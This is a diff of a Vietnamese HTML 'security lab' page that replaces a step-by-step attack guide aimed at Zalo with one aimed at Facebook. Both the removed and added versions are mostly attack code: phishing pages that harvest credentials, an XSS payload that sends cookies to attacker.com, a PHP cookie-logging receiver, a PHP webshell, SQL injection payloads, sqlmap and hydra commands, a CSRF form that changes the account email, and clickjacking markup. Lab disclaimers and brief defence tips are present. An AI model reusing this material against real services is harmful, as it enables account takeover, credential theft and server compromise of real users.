@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zalo Security Lab – Hướng dẫn & Code</title>
+<title>Facebook Security Lab – Hướng dẫn kỹ thuật</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0a0a0a; color:#00ff41; font-family:'Courier New',monospace; height:100vh; display:flex; flex-direction:column; }
@@ -16,108 +16,124 @@ body { background:#0a0a0a; color:#00ff41; font-family:'Courier New',monospace; h
 #content { flex:1; padding:20px; overflow-y:auto; background:#0d0d0d; white-space:pre-wrap; word-wrap:break-word; line-height:1.5; font-size:13px; }
 ::-webkit-scrollbar { width:6px; background:#111; }
 ::-webkit-scrollbar-thumb { background:#ffaa00; }
+.warning { color:#ff4444; font-weight:bold; }
 </style>
 </head>
 <body>
 <div id="header">
-    <h1>📱 ZALO SECURITY LAB – TẤN CÔNG WEB & API</h1>
+    <h1>🔐 FB SECURITY LAB – KỸ THUẬT TẤN CÔNG & PHÒNG CHỐNG</h1>
     <span style="color:#888;">mod by TheAnnh</span>
 </div>
 <div id="main">
     <div id="sidebar">
-        <div class="menu-item active" onclick="loadContent('step1')">1. Recon</div>
-        <div class="menu-item" onclick="loadContent('step2')">2. SQLi</div>
-        <div class="menu-item" onclick="loadContent('step3')">3. XSS</div>
+        <div class="menu-item active" onclick="loadContent('step1')">1. Recon OSINT</div>
+        <div class="menu-item" onclick="loadContent('step2')">2. Phishing</div>
+        <div class="menu-item" onclick="loadContent('step3')">3. Session Hijacking</div>
         <div class="menu-item" onclick="loadContent('step4')">4. CSRF</div>
-        <div class="menu-item" onclick="loadContent('step5')">5. Upload</div>
-        <div class="menu-item" onclick="loadContent('step6')">6. IDOR</div>
-        <div class="menu-item" onclick="loadContent('step7')">7. Brute‑force</div>
-        <div class="menu-item" onclick="loadContent('step8')">8. Phishing</div>
+        <div class="menu-item" onclick="loadContent('step5')">5. Clickjacking</div>
+        <div class="menu-item" onclick="loadContent('step6')">6. XSS (nếu có)</div>
+        <div class="menu-item" onclick="loadContent('step7')">7. Brute‑force & Rate limit</div>
+        <div class="menu-item" onclick="loadContent('step8')">8. Bảo vệ & Kết luận</div>
     </div>
-    <div id="content">Chọn một bước để xem hướng dẫn và code mẫu.</div>
+    <div id="content">Chọn một bước để xem chi tiết.</div>
 </div>
 
 <script>
 const data = {
 step1: `
-[1] RECON – THU THẬP THÔNG TIN ZALO (LAB)
+[1] RECON OSINT – THU THẬP THÔNG TIN CÔNG KHAI
 
-Mục tiêu: xác định subdomain, endpoint API, công nghệ sử dụng.
+Mục tiêu: thu thập email, số điện thoại, tên người dùng, bạn bè, trang đã thích.
 
-A) Dùng theHarvester: theHarvester -d zalo.com -l 500 -b google,bing,linkedin
-B) Dùng Sublist3r: python sublist3r.py -d zalo.com
-C) Dùng nikto: nikto -h https://zalo.com
+A) Sử dụng công cụ:
+   - theHarvester: theHarvester -d facebook.com -l 100 -b google,bing
+   - Recon-ng: modules load recon/domains-hosts/google_site; set source facebook.com; run
+   - Sherlock (tìm tài khoản trên nhiều nền tảng): sherlock username
 
-D) Phân tích header, cookie, tham số:
-   - Burp Suite → Intercept request → kiểm tra các tham số như `uid`, `token`, `key`.
+B) Sử dụng API GraphQL của Facebook (công khai):
+   - Truy cập: https://graph.facebook.com/{user-id}?access_token={token}
+   - Lấy thông tin cơ bản, bạn bè, bài viết công khai.
 
-Code mẫu (Python) lấy thông tin WHOIS và DNS:
-------------------------------------------------
-import whois, dns.resolver
-domain = "zalo.com"
-# WHOIS
-w = whois.whois(domain)
-print(w)
-# DNS
-answers = dns.resolver.resolve(domain, 'A')
-for rdata in answers: print(rdata)
-------------------------------------------------
+C) Dùng Maltego để vẽ sơ đồ quan hệ.
 
-Kết quả: Danh sách IP, subdomain, công nghệ (nginx, PHP, Node.js).
-`,
-step2: `
-[2] SQL INJECTION – LẤY DỮ LIỆU TỪ DATABASE
-
-A) Tìm tham số GET/POST như `id`, `user`, `product`.
-B) Thử payload: ' OR '1'='1 ; '; DROP TABLE users; --
-C) Dùng sqlmap: sqlmap -u "https://zalo.com/profile?id=1" --batch --level=5 --risk=3 --dbs
-
-D) Khai thác UNION: ?id=1 UNION SELECT 1,2,3,4,5 --
-
-Code mẫu (Python) inject thủ công:
+Code mẫu (Python) lấy thông tin công khai:
 ------------------------------------------------
 import requests
-url = "https://zalo.com/search"
-params = {"q": "1' OR '1'='1"}
-r = requests.get(url, params=params)
-if "error" not in r.text:
-    print("SQLi detected")
+user_id = "4"  # Mark Zuckerberg
+token = "EAAC..." # token khách truy cập
+url = f"https://graph.facebook.com/{user_id}?access_token={token}"
+r = requests.get(url)
+print(r.json())
 ------------------------------------------------
 
-Chú ý: Zalo thực tế có thể đã vá, nhưng lab luôn có lỗ hổng.
+Kết quả: danh sách email, số điện thoại, tên người dùng hợp lệ.
+`,
+step2: `
+[2] PHISHING – GIẢ MẠO TRANG ĐĂNG NHẬP
+
+Mục tiêu: lừa nạn nhân nhập thông tin đăng nhập.
+
+A) Clone trang đăng nhập:
+   - Dùng Social‑Engineer Toolkit (SET): setoolkit → Social-Engineering Attacks → Website Attack Vectors → Credential Harvester
+   - Hoặc tự tạo trang HTML giống hệt.
+
+B) Gửi link qua email, chat, tin nhắn (với URL giả mạo, ví dụ: faceb00k.com).
+
+C) Khi nạn nhân nhập user/pass, dữ liệu được gửi về server của attacker.
+
+Code mẫu (PHP) lưu thông tin:
+------------------------------------------------
+<?php
+$user = $_POST['email'];
+$pass = $_POST['pass'];
+file_put_contents("creds.txt", "$user:$pass\n", FILE_APPEND);
+header("Location: https://facebook.com");
+?>
+------------------------------------------------
+
+D) Sử dụng SSL để tăng độ tin cậy (Let's Encrypt miễn phí).
+
+Cách phòng: dùng 2FA, không bấm link lạ.
 `,
 step3: `
-[3] XSS – THỰC THI SCRIPT TRÊN TRÌNH DUYỆT
+[3] SESSION HIJACKING – ĐÁNH CẮP COOKIE
 
-A) Tìm input không lọc: form tìm kiếm, bình luận, hồ sơ.
-B) Thử payload: <script>alert('XSS')</script>
-C) Nếu thành công, lấy cookie: document.location='http://attacker.com/steal.php?c='+document.cookie
+Mục tiêu: lấy cookie session của nạn nhân để đăng nhập mà không cần mật khẩu.
+
+A) Tấn công Man‑in‑the‑Middle (MITM):
+   - Sử dụng ettercap/bettercap để chặn lưu lượng.
+   - Dùng Wireshark để bắt gói HTTP (nếu không dùng HTTPS).
+
+B) Tấn công XSS để đánh cắp cookie (nếu tìm thấy lỗ hổng):
+   - <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
+
+C) Sử dụng BeEF framework để điều khiển trình duyệt nạn nhân.
 
 Code mẫu (PHP) nhận cookie:
 ------------------------------------------------
 <?php
-if(isset($_GET['c'])) {
-    file_put_contents("cookies.txt", $_GET['c']."\n", FILE_APPEND);
-}
+$cookie = $_GET['c'];
+file_put_contents("cookies.txt", $cookie."\n", FILE_APPEND);
 ?>
 ------------------------------------------------
 
-D) Dùng BeEF để điều khiển trình duyệt nạn nhân.
+D) Dùng cookie để đăng nhập: chèn vào trình duyệt bằng console hoặc extension.
 `,
 step4: `
-[4] CSRF – GIẢ MẠO YÊU CẦU
+[4] CSRF – TẤN CÔNG GIẢ MẠO YÊU CẦU
 
-Mục tiêu: thay đổi email, mật khẩu, hoặc gửi tin nhắn khi nạn nhân đăng nhập.
+Mục tiêu: thực hiện hành động thay đổi email, mật khẩu khi nạn nhân đang đăng nhập.
 
-A) Tìm chức năng không có token CSRF.
-B) Tạo form tự động submit:
+A) Tìm chức năng không có token CSRF (ví dụ: thay đổi email, đăng bài).
+B) Tạo form ẩn tự động submit.
+C) Gửi link đến nạn nhân.
 
-Code mẫu (HTML):
+Code mẫu (HTML) thay đổi email:
 ------------------------------------------------
 <html>
 <body>
-<form action="https://zalo.com/change_email" method="POST">
-  <input type="hidden" name="email" value="attacker@evil.com">
+<form action="https://facebook.com/settings/email" method="POST">
+  <input type="hidden" name="email" value="hacker@evil.com">
   <input type="submit" value="Click">
 </form>
 <script>document.forms[0].submit();</script>
@@ -125,96 +141,88 @@ Code mẫu (HTML):
 </html>
 ------------------------------------------------
 
-C) Gửi link đến nạn nhân.
+Facebook có CSRF token nên thường không thành công, nhưng vẫn có thể trên các ứng dụng cũ.
 `,
 step5: `
-[5] FILE UPLOAD – TẢI WEBSHELL
+[5] CLICKJACKING – LỪA BẤM VÀO NÚT GIẢ
 
-A) Tìm form upload ảnh, avatar.
-B) Thử tải shell.php với nội dung: <?php system($_GET['cmd']); ?>
-C) Nếu thành công, truy cập và chạy lệnh:
-   https://zalo.com/uploads/shell.php?cmd=id
+Mục tiêu: hiển thị một trang trong iframe trong suốt để nạn nhân bấm vào nút Like hoặc Share mà không biết.
 
-Code mẫu webshell:
+A) Tạo trang web chứa iframe trỏ đến Facebook.
+B) Đặt iframe trong suốt (opacity:0) và đè lên một nút giả.
+C) Khi nạn nhân bấm nút giả, thực tế họ đang bấm Like trên Facebook.
+
+Code mẫu (HTML):
 ------------------------------------------------
-<?php
-if(isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
-?>
+<style>
+iframe { width:500px; height:500px; opacity:0; position:absolute; z-index:999; }
+button { position:relative; z-index:1; }
+</style>
+<button>Nhận quà</button>
+<iframe src="https://facebook.com/plugin/like.php?href=..."></iframe>
 ------------------------------------------------
 
-D) Bypass: thay đổi Content‑Type, đuôi kép, null byte.
+Facebook đã có X‑Frame‑Options để chống, nhưng có thể bypass nếu lỗi.
 `,
 step6: `
-[6] IDOR – TRUY CẬP DỮ LIỆU NGƯỜI KHÁC
+[6] XSS – CÓ THỂ XUẤT HIỆN TRÊN CÁC TIỂU ỨNG DỤNG CŨ
 
-A) Tìm tham số số trong URL: /profile?uid=123, /message?chat_id=456
-B) Thay đổi giá trị: uid=124, chat_id=457
-C) Nếu thấy dữ liệu của người khác → IDOR.
+Mục tiêu: thực thi script trên trình duyệt của nạn nhân.
 
-Code mẫu (Python) brute‑force ID:
-------------------------------------------------
-import requests
-for i in range(1, 100):
-    url = f"https://zalo.com/profile?uid={i}"
-    r = requests.get(url)
-    if "User" in r.text and "Not found" not in r.text:
-        print(f"Found: {i}")
-        break
-------------------------------------------------
+A) Tìm input không lọc: bình luận, nhóm, sự kiện.
+B) Thử payload: <img src=x onerror=alert('XSS')>
 
-Cách phòng: kiểm tra quyền truy cập (authorization).
+C) Khai thác: đánh cắp cookie, keylog, hoặc gửi bài viết giả.
+
+Facebook rất mạnh về bảo mật, XSS gần như không thể nhưng có thể trên ứng dụng bên thứ ba.
 `,
 step7: `
-[7] BRUTE‑FORCE ĐĂNG NHẬP
+[7] BRUTE‑FORCE & RATE LIMIT
 
-A) Xác định endpoint login (POST).
-B) Dùng hydra: hydra -L users.txt -P rockyou.txt zalo.com https-post-form "/login:user=^USER^&pass=^PASS^:F=error"
+Mục tiêu: thử hàng triệu mật khẩu để tìm đúng.
 
-C) Dùng Python script:
+A) Sử dụng hydra: hydra -l user@email.com -P rockyou.txt https://m.facebook.com/login
+B) Nhưng Facebook có rate limiting và captcha, nên không khả thi.
 
-Code mẫu (Python):
+C) Tấn công vào các dịch vụ kết nối (OAuth) nếu yếu.
+
+Code mẫu (Python) brute‑force (chỉ để thử trên lab):
 ------------------------------------------------
 import requests
-users = ["admin","test","user1"]
-passwords = ["123456","password","qwerty"]
-url = "https://zalo.com/login"
+url = "https://target-lab.com/login"
+users = ["admin","test"]
+passwords = ["123456","password"]
 for u in users:
-    for p in passwords:
-        r = requests.post(url, data={"user":u, "pass":p})
-        if "Welcome" in r.text:
-            print(f"Found: {u}:{p}")
-            exit()
+  for p in passwords:
+    r = requests.post(url, data={"user":u,"pass":p})
+    if "welcome" in r.text: print(u,p)
 ------------------------------------------------
 
-Lưu ý: Zalo có rate limiting và captcha, nên không hiệu quả.
+Cách phòng: 2FA, captcha, khóa tài khoản.
 `,
 step8: `
-[8] PHISHING – LỪA ĐẢO LẤY MẬT KHẨU
+[8] BẢO VỆ VÀ KẾT LUẬN
 
-Mục tiêu: tạo trang đăng nhập giả mạo để lấy user/pass.
+Facebook đã áp dụng nhiều biện pháp bảo mật mạnh mẽ:
+- HTTPS toàn bộ
+- CSRF token
+- X‑Frame‑Options
+- Content Security Policy (CSP)
+- 2FA (xác thực hai yếu tố)
+- Giám sát đăng nhập bất thường
 
-A) Clone trang đăng nhập của Zalo (dùng SET hoặc tự viết).
-B) Dùng HTTPS với chứng chỉ giả để tăng độ tin cậy.
-C) Gửi link qua email, SMS.
+Để bảo vệ bản thân:
+1. Bật 2FA
+2. Không bấm link lạ
+3. Sử dụng trình quản lý mật khẩu
+4. Cập nhật trình duyệt
+5. Kiểm tra thiết bị đang đăng nhập thường xuyên
 
-Code mẫu (PHP) lưu thông tin:
-------------------------------------------------
-<?php
-$user = $_POST['username'];
-$pass = $_POST['password'];
-file_put_contents("creds.txt", "$user:$pass\n", FILE_APPEND);
-header("Location: https://zalo.com");
-?>
-------------------------------------------------
+**Kết luận:** Các kỹ thuật trên chỉ có hiệu quả nếu Facebook có lỗ hổng. 
+Trên thực tế, Facebook trả tiền cho các lỗ hổng (bug bounty) và sửa rất nhanh.
+Vì vậy, cách duy nhất để "hack" Facebook là thông qua kỹ thuật xã hội (lừa đảo) hoặc lấy cắp thiết bị.
 
-Cách phòng: 2FA, không bấm link lạ, kiểm tra URL.
-
-**TỔNG KẾT:**  
-- Các kỹ thuật trên đều là lý thuyết và áp dụng cho lab.  
-- Zalo thực tế có bảo mật rất tốt, khó khai thác.  
-- Hãy sử dụng kiến thức để bảo vệ, không tấn công trái phép.
+**TUÂN THỦ PHÁP LUẬT:** Không thực hiện bất kỳ hành vi nào ngoài môi trường lab được phép.
 `
 };
 
